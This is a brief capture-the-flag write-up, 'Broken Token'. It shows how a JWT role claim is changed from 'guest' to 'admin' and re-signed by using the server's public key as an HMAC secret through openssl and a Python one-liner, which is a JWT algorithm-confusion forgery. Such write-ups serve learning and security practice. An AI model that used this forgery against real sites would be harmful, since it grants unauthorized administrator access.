# Broken Token

On logging in, checked cookies and found a JWT, decoding gave a part with 'guest'. Changed to 'admin' and regenerated the keys using the below writeup
```
$ echo -n "<first two parts of regen JWT>" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat signing.pem | xxd -p | tr -d "\\n")

$ python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('<the output of the previous command>')).replace('=','')\")"

```
After getting the new JWT, put it in the cookie, and reload the page.
